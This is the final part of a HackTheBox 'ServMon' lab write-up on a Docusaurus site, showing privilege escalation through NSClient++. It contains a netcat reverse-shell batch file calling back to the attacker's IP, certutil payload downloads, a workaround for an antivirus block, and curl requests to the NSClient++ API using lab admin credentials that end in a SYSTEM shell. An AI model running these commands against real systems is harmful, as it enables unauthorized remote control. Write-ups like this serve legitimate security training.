plain">CheckDisk = disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckSystem = disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WEBServer = enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NRPEServer = enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; CheckTaskSched - Check status of your scheduled jobs.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckTaskSched = enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Scheduler = enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; CheckExternalScripts - Module used to execute external scripts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckExternalScripts = enabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/external scripts/wrappings]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Batch file - Command used for executing wrapped batch files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bat = scripts\\%SCRIPT% %ARGS%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Visual basic script - Command line used for wrapped vbs scripts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ps1 = cmd /c echo If (-Not (Test-Path &quot;scripts\%SCRIPT%&quot;) ) { Write-Host &quot;UNKNOWN: Script `&quot;%SCRIPT%`&quot; not found.&quot;; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/external scripts/scripts]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Schedules - Section for the Scheduler module.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/scheduler/schedules]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">foobar = command = foobar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; External script settings - General settings for the external scripts module (CheckExternalScripts).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/external scripts]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">allow arguments = true</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>allowed hosts = 127.0.0.1</code> tells us we can authenticate only from localhost.</p><p>But as we have an SSH access we can do some local port forwarding (you can read
about this technique on my <a href="https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/" target="_blank" rel="noopener noreferrer">article about pivoting</a>).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh nadine@10.10.10.184 -L 127.0.0.1:9999:127.0.0.1:8443 -N</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We map the local port 8443 on ServMon machine to local port 9999 on our machine.</p><p>Now we should be able to authenticate at <a href="https://127.0.0.1:9999/" target="_blank" rel="noopener noreferrer">https://127.0.0.1:9999/</a> with password
<code>ew2x6SsGTxjRwXOT</code>.</p><p>Now the exploit tell us to enable some modules:</p><ul><li>CheckExternalScripts</li><li>Scheduler</li></ul><p>Now let&#x27;s prepare our backdoor script: <code>cyfun.bat</code></p><div class="language-bat codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bat codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">@echo off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can try to download the bat script with <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download" target="_blank" rel="noopener noreferrer">Certutil</a>
and a local HTTP server.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ python -m http.server --bind 10.10.15.26</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But that&#x27;s a failure:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\Nadine&gt; cd C:\temp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\temp&gt; certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat cyfun.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">At line:1 char:1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+ certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat no ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">This script contains malicious content and has been blocked by your antivirus software.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can&#x27;t download our script because it&#x27;s blocked by an AV. So let&#x27;s create is on
the server directly.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\temp&gt; echo &quot;@echo off&quot; &gt; cyfun.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\temp&gt; echo &quot;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&quot; &gt;&gt; cyfun.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\temp&gt; gc cyfun.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">@echo off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I tried to download <code>nc.exe</code> with certutils but it was blocked by the AV too.</p><p>So I downloaded it via scp:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ scp nc.exe nadine@10.10.10.184:/temp/nc.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I tried to create the RCE via the webUI as in the exploit but wasn&#x27;t successful.</p><ul><li><a href="https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts" target="_blank" rel="noopener noreferrer">https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts</a></li><li><a href="https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules" target="_blank" rel="noopener noreferrer">https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules</a></li></ul><p>So instead I created the task via the API:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:9999/api/v1/scripts/ext/scripts/cyfun.bat --data-binary &quot;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Added cyfun as scripts\cyfun.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:9999/api/v1/queries/cyfun/commands/execute\?time\=1m</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">{&quot;command&quot;:&quot;cyfun&quot;,&quot;lines&quot;:[{&quot;message&quot;:&quot;Command cyfun didn&#x27;t terminate within the timeout period 60s&quot;,&quot;perf&quot;:{}}],&quot;result&quot;:3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And finally got a privileged shell:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ nc -nlp 8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 10.0.18363.752]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(c) 2019 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Program Files\NSClient++&gt;whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nt authority\system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Program Files\NSClient++&gt;type c:\users\administrator\desktop\root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">72c07cb24f21e63a855346edcd0816cb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/windows/">windows</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/smb/">smb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/ftp/">ftp</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/http/">http</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/ScriptKiddie/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">ScriptKiddie </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/SneakyMailer/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">SneakyMailer </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#-info" class="table-of-contents__link toc-highlight">ðŸ’¢ Info</a><ul><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network Enumeration</a></li><li><a href="#network-reconnaissance-ftp" class="table-of-contents__link toc-highlight">Network reconnaissance: FTP</a></li><li><a href="#network-reconnaissance-http" class="table-of-contents__link toc-highlight">Network reconnaissance: HTTP</a></li><li><a href="#network-reconnaissance-smb" class="table-of-contents__link toc-highlight">Network reconnaissance: SMB</a></li><li><a href="#network-reconnaissance-ftp-lets-go-back" class="table-of-contents__link toc-highlight">Network reconnaissance: FTP (let&#39;s go back)</a></li><li><a href="#network-reconnaissance-http-lets-go-back" class="table-of-contents__link toc-highlight">Network reconnaissance: HTTP (let&#39;s go back)</a></li><li><a href="#network-exploitation-ssh" class="table-of-contents__link toc-highlight">Network exploitation: SSH</a></li><li><a href="#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem" class="table-of-contents__link toc-highlight">Privilege Escalation  through NSClient++: Nadine to NT AuthoritySYSTEM</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   â™¥  by CyFun Â© 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>